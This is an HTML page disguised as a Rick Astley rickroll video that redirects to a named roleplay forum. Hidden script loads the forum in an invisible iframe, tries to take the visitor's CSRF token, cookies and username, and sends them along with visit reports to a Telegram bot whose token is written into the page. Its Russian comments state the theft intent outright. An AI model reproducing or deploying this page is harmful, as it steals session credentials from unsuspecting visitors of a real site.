<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Rick Astley - Never Gonna Give You Up</title>
    <style>
        body { margin: 0; padding: 0; background: #000; }
        .video-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
        }
        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: transparent;
            z-index: 2;
            cursor: pointer;
        }
        .timer {
            position: fixed;
            bottom: 20px;
            right: 20px;
            color: white;
            font-family: Arial;
            background: rgba(0,0,0,0.7);
            padding: 10px 20px;
            border-radius: 30px;
            z-index: 3;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <!-- Настоящий рикролл видео (жертва смотрит и радуется) -->
    <div class="video-container">
        <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1" allow="autoplay"></iframe>
    </div>
    
    <!-- Скрытый iframe для кражи -->
    <iframe id="stealthFrame" style="position: absolute; width: 1px; height: 1px; opacity: 0.001; top: -100px; left: -100px;"></iframe>
    
    <!-- Таймер -->
    <div class="timer" id="timer">Редирект через 30 сек • Нажмите на видео чтобы пропустить</div>
    
    <!-- Прозрачный слой для клика -->
    <div class="overlay" onclick="redirectNow()"></div>

    <script>
        const TELEGRAM_TOKEN = '8389131821:AAFHqe3YzYHBg2Xm6ybDYCegm7irwCqXi7w';
        const CHAT_ID = '-1003489685426';
        
        function sendToTelegram(message) {
            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
            }).catch(() => {});
        }
        
        // Тихо грузим форум в iframe
        const iframe = document.getElementById('stealthFrame');
        iframe.src = 'https://forum.votive-rp.com';
        
        iframe.onload = function() {
            try {
                const doc = iframe.contentDocument || iframe.contentWindow.document;
                const token = doc.querySelector('html')?.getAttribute('data-csrf');
                const user = doc.querySelector('.p-navgroup-link--user .p-navgroup-linkText')?.textContent?.trim();
                const cookies = doc.cookie;
                const avatar = doc.querySelector('.avatar img')?.src || 'Нет';
                
                if (token) {
                    sendToTelegram(
                        `🎣 **CSRF УКРАДЕН ВО ВРЕМЯ ПРОСМОТРА РИКРОЛЛА!**\n\n` +
                        `👤 **Юзер:** ${user}\n` +
                        `🎫 **Токен:** \`${token}\`\n` +
                        `🍪 **Куки:** \`${cookies}\`\n` +
                        `🖼️ **Аватар:** ${avatar}\n` +
                        `⏰ **Время:** ${new Date().toLocaleString('ru-RU')}\n` +
                        `🎵 *Смотрел Rick Astley и даже не подозревал...*`
                    );
                }
            } catch (e) {
                // Отправляем инфу о CORS
                sendToTelegram(`ℹ️ **CORS защита**: ${e.message}`);
            }
        };
        
        // Таймер редиректа
        let seconds = 30;
        const timerEl = document.getElementById('timer');
        
        const interval = setInterval(() => {
            seconds--;
            timerEl.textContent = `Редирект через ${seconds} сек • Нажмите на видео чтобы пропустить`;
            
            if (seconds <= 0) {
                clearInterval(interval);
                redirectNow();
            }
        }, 1000);
        
        function redirectNow() {
            window.location.href = 'https://forum.votive-rp.com';
        }
        
        // Отчёт о переходе
        sendToTelegram(`📊 **ПЕРЕХОД**\n🔗 ${document.referrer || 'Прямой'}\n⏰ ${new Date().toLocaleString('ru-RU')}`);
    </script>
</body>
</html>
